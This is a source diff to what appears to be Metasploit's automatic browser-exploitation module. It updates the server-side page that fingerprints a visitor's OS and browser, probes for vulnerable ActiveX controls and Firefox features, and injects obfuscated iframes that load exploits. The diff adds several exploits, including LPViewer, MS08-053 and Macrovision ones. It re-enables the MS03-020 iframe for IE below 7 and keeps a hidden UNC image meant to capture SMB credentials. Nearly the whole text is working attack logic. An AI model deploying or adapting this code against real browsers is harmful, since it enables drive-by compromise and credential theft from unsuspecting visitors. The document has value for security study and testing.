@@ -1,5 +1,5 @@
 ##
-# $Id:$
+# $Id$
 ##
 
 ##
@@ -94,16 +94,19 @@ class Metasploit3 < Msf::Auxiliary
 
 		# Firefox < 1.0.5
 		# requires javascript
+		# currently only has a windows target
 		init_exploit('exploit/multi/browser/mozilla_compareto')
 
 		# Firefox < 1.5.0.5
 		# requires java
 		# requires javascript
+		# Has targets for Windows, Linux x86, MacOSX x86/PPC, no auto
 		init_exploit('exploit/multi/browser/mozilla_navigatorjava')
 
 		# Firefox < 1.5.0.1
 		# For now just use the default target of Mac.
 		# requires javascript
+		# Has targets for MacOSX PPC and Linux x86, no auto
 		init_exploit('exploit/multi/browser/firefox_queryinterface')
 
 		# works on iPhone 
@@ -134,7 +137,7 @@ class Metasploit3 < Msf::Auxiliary
 		# I'm pretty sure keyframe works on everything this works on and more,
 		# so for now leave it out.
 		# requires javascript
-		#init_exploit('exploit/windows/browser/ms06_055_vml_method')
+		# init_exploit('exploit/windows/browser/ms06_055_vml_method')
 
 		# Works on default IE 5 and 6
 		# requires javascript 
@@ -151,6 +154,18 @@ class Metasploit3 < Msf::Auxiliary
 		# obvious to the user when this exploit loads, so leave it out for now.
 		# does not require javascript
 		#init_exploit('exploit/windows/browser/winamp_playlist_unc')
+
+
+		# untested
+		init_exploit('exploit/windows/browser/systemrequirementslab_unsafe')
+		# untested
+		init_exploit('exploit/windows/browser/lpviewer_url')
+		# untested
+		init_exploit('exploit/windows/browser/softartisans_getdrivename')
+		# untested
+		init_exploit('exploit/windows/browser/ms08_053_mediaencoder')
+		# untested
+		init_exploit('exploit/windows/browser/macrovision_unsafe')
 
 
 		#
@@ -248,44 +263,39 @@ class Metasploit3 < Msf::Auxiliary
 			
 		response = create_response()
 
-		# TODO: instead of writing all of the iframes at once,
-		# consider having a javascript timeout function that writes
-		# each exploit's iframe so they don't step on each other.
-		# I'm not sure this is really an issue since IE seems to
-		# just load the next iframe when the first didn't crash it.
+		objects = []
 
-		objects = { 
-			'DirectAnimation.PathControl'            => @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource, 
-			'{88d969c5-f192-11d4-a65f-0040963251e5}' => @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource,
-			'{36723F97-7AA0-11D4-8919-FF2D71D0D32C}' => @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource,
-			'{BD96C556-65A3-11D0-983A-00C04FC29E36}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{BD96C556-65A3-11D0-983A-00C04FC29E30}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
-			'{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
-			'{6414512B-B978-451D-A0D8-FCFDF33E833C}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{06723E09-F4C2-43c8-8358-09FCD1DB0766}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{639F725F-1B2D-4831-A9FD-874847682010}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{BA018599-1DB3-44f9-83B4-461454C84BF8}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{E8CCCDDF-CA28-496b-B050-6C07C962476B}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{AB9BCEDD-EC7E-47E1-9322-D4A210617116}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource, 
-			'{0006F033-0000-0000-C000-000000000046}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
-			'{0006F03A-0000-0000-C000-000000000046}' => @exploits['exploit/windows/browser/ie_createobject'].get_resource,
-		}
-		hash_declaration = objects.map{ |k, v| "'#{k}', '#{v}'," }.join.chop
+		objects += [ 
+			[ 'DirectAnimation.PathControl',            'KeyFrame', @exploits['exploit/windows/browser/ms06_067_keyframe'].get_resource ],
+			[ 'LPViewer.LPViewer.1',                    'URL', @exploits['exploit/windows/browser/lpviewer_url'].get_resource ],
+			[ '{88D969C5-F192-11D4-A65F-0040963251E5}', 'SetRequestHeader', @exploits['exploit/windows/browser/ms06_071_xml_core'].get_resource ],
+			[ '{36723F97-7AA0-11D4-8919-FF2D71D0D32C}', 'GetDriverSettings', @exploits['exploit/windows/browser/novelliprint_getdriversettings'].get_resource ],
+			[ '{BD96C556-65A3-11D0-983A-00C04FC29E36}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{BD96C556-65A3-11D0-983A-00C04FC29E30}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
+			[ '{7F5B7F63-F06F-4331-8A26-339E03C0AE3D}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
+			[ '{6414512B-B978-451D-A0D8-FCFDF33E833C}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{06723E09-F4C2-43C8-8358-09FCD1DB0766}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{639F725F-1B2D-4831-A9FD-874847682010}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{BA018599-1DB3-44F9-83B4-461454C84BF8}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{D0C07D56-7C69-43F1-B4A0-25F5A11FAB19}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{E8CCCDDF-CA28-496B-B050-6C07C962476B}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{AB9BCEDD-EC7E-47E1-9322-D4A210617116}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ], 
+			[ '{0006F033-0000-0000-C000-000000000046}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
+			[ '{0006F03A-0000-0000-C000-000000000046}', 'CreateObject', @exploits['exploit/windows/browser/ie_createobject'].get_resource ],
+			[ '{67A5F8DC-1A4B-4D66-9F24-A704AD929EEE}', 'Init', @exploits['exploit/windows/browser/systemrequirementslab_unsafe'].get_resource ],
+			[ '{A8D3AD02-7508-4004-B2E9-AD33F087F43C}', 'GetDetailsString', @exploits['exploit/windows/browser/ms08_053_mediaencoder'].get_resource ],
+		]
+		objects = objects.map{ |arr| "new Array('#{arr[0]}', '#{arr[1]}', '#{arr[2]}')," }.join("\n").chop
 
 		js = <<-ENDJS
+			var DEBUGGING = false;
 
 			#{js_os_detect}
 			#{js_base64}
-
-			// Hash implementation stolen from http://www.mojavelinux.com/articles/javascript_hashes.html
-			function Hash() {
-				this.length = 0;
-				this.items = new Array();
-				for (var current_item = 0; current_item < arguments.length; current_item += 2) {
-					if (typeof(arguments[current_item + 1]) != 'undefined') {
-						this.items[arguments[current_item]] = arguments[current_item + 1];
-						this.length++;
+			if (!(typeof(debug)== 'function')) {
+				function debug(msg) {
+					if (DEBUGGING) {
+						document.writeln(msg);
 					}
 				}
 			}
@@ -306,19 +316,19 @@ class Metasploit3 < Msf::Auxiliary
 					return(0);
 				}
 				encoded_detection =  new String();
-				encoded_detection += detected_version.os_name + cruft; 
-				encoded_detection += detected_version.os_flavor + cruft; 
-				encoded_detection += detected_version.os_sp + cruft; 
-				encoded_detection += detected_version.os_lang + cruft; 
-				encoded_detection += detected_version.arch + cruft; 
-				encoded_detection += detected_version.browser_name + cruft; 
-				encoded_detection += detected_version.browser_version; 
+				encoded_detection += detected_version.os_name + cruft;
+				encoded_detection += detected_version.os_flavor + cruft;
+				encoded_detection += detected_version.os_sp + cruft;
+				encoded_detection += detected_version.os_lang + cruft;
+				encoded_detection += detected_version.arch + cruft;
+				encoded_detection += detected_version.browser_name + cruft;
+				encoded_detection += detected_version.browser_version;
 				while (-1 != encoded_detection.indexOf(cruft)) {
 					encoded_detection = encoded_detection.replace(cruft, ":");
 				}
-				document.write(encoded_detection + "<br>");
+				//debug(encoded_detection + "<br>");
 				encoded_detection = Base64.encode(encoded_detection);
-				document.write(encoded_detection + "<br>");
+				//debug(encoded_detection + "<br>");
 				xmlhr.open("GET", document.location + "?sessid=" + encoded_detection, false);
 				xmlhr.send(null);
 			}
@@ -338,88 +348,106 @@ class Metasploit3 < Msf::Auxiliary
 				} catch (e) {}
 
 				if ("#{HttpClients::IE}" == detected_version.browser_name) {
-					//document.write("This is IE<br />");
-					// object_list contains key-value pairs like 
-					//        {classid} => /srvpath/to/exploit/for/classid
-					//   and
-					//        ActiveXname => /srvpath/to/exploit/for/ActiveXname
-					var object_list = new Hash(#{hash_declaration});
+					//debug("This is IE<br />");
+					var object_list = new Array(#{objects});
 					var vuln_obj;
 					var written_frames = new Array();
 
 					// iterate through our list of exploits 
-					//document.write("I have " + object_list.length + " objects to test <br />");
-					for (var current_item in object_list.items) {
-						//document.write("Testing for object " + current_item + " ... ");
+					debug("I have " + object_list.length + " objects to test <br />");
+					for (var current_object in object_list) {
+						debug("Testing for object " + current_object + " ... ");
 						// Don't write the same iframe more than once.  This is
 						// only an issue with ie_createobject which uses a ton of
 						// different classids to perform the same exploit.
 						// Assumes that no url will be a substring of another url.
-						if (-1 != written_frames.toString().indexOf(object_list.items[current_item])) {
-							//document.write("Already wrote an iframe for " + object_list.items[current_item] +"<br>");
+						if (-1 != written_frames.toString().indexOf(object_list[current_object][2])) {
+							debug("Already wrote an iframe for " + object_list[current_object][0] +"<br>");
 							continue;
 						}
-						vuln_obj = ''; 
-						if (current_item.substring(0,1) == '{') {
-							//document.write("which is a clasid <br />");
+						vuln_obj = '';
+						if (object_list[current_object][0].substring(0,1) == '{') {
+							var name = object_list[current_object][0].substring( 1, object_list[current_object][0].length - 1 );
+							//debug("which is a classid <br />");
 
 							// classids are stored surrounded in braces for an easy way to tell 
 							// them from ActiveX object names, so if it has braces, strip them 
 							// out and create an object element with that classid
-							var vuln_obj = document.createElement("object");
+							vuln_obj = document.createElement("object");
+							vuln_obj.setAttribute("classid", "clsid:" + name);
 
-							vuln_obj.setAttribute("classid", "clsid:" + current_item.substring( 1, current_item.length - 1 ) ) ;
+							vuln_obj.setAttribute("id", name);
 						} else {
-							//document.write("which is an AXO name <br />");
-
 							// otherwise, try to create an AXO with that name
-							try { vuln_obj = new ActiveXObject(current_item); } catch(e){}
+							try { 
+								vuln_obj = new ActiveXObject(object_list[current_object][0]);
+							} catch(e){ 
+								vuln_obj = '';
+							}
+							debug("did ActiveXObject("+ object_list[current_object][0] +") and i got a "+ typeof(vuln_obj) +"<br>");
 						}
-						// This doesn't bloody work.  vuln_obj is always something
-						// that evaluates to true but there doesn't seem to be any
-						// way of determining if it is actually an ActiveX object.
-						// Since we can't tell if it will work, we end up just sending
-						// all of the iframes; some of them don't work, some of them
-						// do and we get multiple shells.  Junior Varsity.
-						if (vuln_obj) {
-							document.write("It exists, making evil iframe <br />");
-							sploit_frame += '#{build_iframe("' + object_list.items[current_item] + '")}';
-							// why the hell is there no array.push() in javascript?
-							written_frames[written_frames.length] = object_list.items[current_item];
-						} else {
-							//document.write("It does NOT exist, skipping. <br />");
+						// javascript lets us access method names like array
+						// elements, so obj.foo is the same as obj['foo']
+						// However, ActiveX objects created with an 
+						// <object classid="..."> tag don't advertise their methods 
+						// the same way other objects do, i.e., in the example
+						// above, foo does not show up in 
+						//     for (var method in obj) { ... } 
+						// It's still there, you just can't see it.  Unfortunately,
+						// there is no method that all ActiveX objects must
+						// implement, so as far as I can tell, there is no generic
+						// way to determine if the object is available.  The 
+						// solution is to check for the existence of a method we
+						// know based on the exploit, e.g. in the case of 
+						// windows/browser/ie_createobject, CreateObject() must
+						// exist.  Methods that don't exist have a 
+						// typeof == 'undefined' whereas exported ActiveX object 
+						// methods have a typeof == 'unknown' 
+						if (typeof(vuln_obj[object_list[current_object][1]]) == 'unknown') {
+							// then we're golden, write the evil iframe
+							sploit_frame += '#{build_iframe("' + object_list[current_object][2] + '")}';
+							// array.push() is not cross-platform 
+							written_frames[written_frames.length] = object_list[current_object][2];
+						//} else if (typeof(vuln_obj[object_list[current_object][1]]) != 'undefined') {
+						//	eval("alert(typeof(vuln_obj."+ object_list[current_object][1] +"));");
 						}
-					} // for each exploit
-				} // if IE
+					} // end for each exploit
+				} // end if IE
 				else {
-					//document.write("this is NOT MSIE<br />");
+					//debug("this is NOT MSIE<br />");
 					if (window.navigator.javaEnabled && window.navigator.javaEnabled()) {
-						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_navigatorjava'].get_resource)}';
+						sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/mozilla_navigatorjava'].get_resource)}";
+					} else {
+						//debug("NO exploit/multi/browser/mozilla_navigatorjava");
 					}
 					if (window.InstallVersion) {
-						sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/mozilla_compareto'].get_resource)}';
+						sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/mozilla_compareto'].get_resource)}";
+					} else {
+						//debug("NO exploit/multi/browser/mozilla_compareto");
 					}
 					// eventually this exploit will have an auto target and
 					// this check won't be necessary
-					//if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
+					if ("#{OperatingSystems::MAC_OSX}" == detected_version.os_name) {
 						if (location.QueryInterface) {
-							sploit_frame += '#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}';
+							sploit_frame += "#{build_iframe(@exploits['exploit/multi/browser/firefox_queryinterface'].get_resource)}";
 						}
-					//}
+					}
 				}
-				if (0 < sploit_frame.length) { 
-					//document.write("Conditions optimal, writing evil iframe(s) <br />"); 
-					document.write(sploit_frame); 
+				if (0 < sploit_frame.length) {
+					// This is isn't working in IE6.  Revert to document.write
+					// until we can come up with something better
+					//body_elem.innerHTML += sploit_frame;
+					document.writeln(sploit_frame);
 				}
 			} // function BodyOnLoad
-			window.onload = BodyOnLoad
+			window.onload = BodyOnLoad;
 		ENDJS
 		opts = {
 			# Strings obfuscation still needs more testing
 			'Strings' => true,
 			'Symbols' => {
 				'Variables' => [
-					'current_item', 'items',
+					'current_object',
 					'body_elem', 'body_id', 
 					'object_list', 'vuln_obj', 
 					'obj_elem', 'sploit_frame',
@@ -439,16 +467,18 @@ class Metasploit3 < Msf::Auxiliary
 		js.update_opts(js_base64.opts)
 		js.obfuscate()
 
-		body  = "<body id=#{js.sym('body_id')}>"
+		body  = "<body id=\"#{js.sym('body_id')}\">"
+
+		body << "<h1> Loading, please wait... </h1>"
 
 		# 
 		# These are non-javascript exploits, send them with all requests in
 		# case the ua is spoofed and js is turned off
 		#
+		
 		body << "<!--[if lt IE 7]>"
-		# commented this out so i can test other exploits
-		# XXX uncomment for release
-		#body << build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)
+		body << build_iframe(@exploits['exploit/windows/browser/ms03_020_ie_objecttype'].get_resource)
+		#body << "Internet Explorer &lt; version 7"
 		body << "<![endif]-->"
 
 		# image for smb_relay 
@@ -457,9 +487,10 @@ class Metasploit3 < Msf::Auxiliary
 		body << %Q{
 			<img src="\\\\#{@lhost}\\#{share_name}\\#{img_name}" style="visibility:hidden" height="0" width="0" border="0" />
 		}
+		body << "<div id=\"osx-non-js\">"
 		body << build_iframe(@exploits['exploit/windows/browser/apple_quicktime_rtsp'].get_resource)
 		body << build_iframe(@exploits['exploit/osx/armle/safari_libtiff'].get_resource)
-
+		body << "</div>"
 
 		response.body = ' <html > <head > <title > Loading </title> '
 		response.body << ' <script language="javascript" type="text/javascript" >'
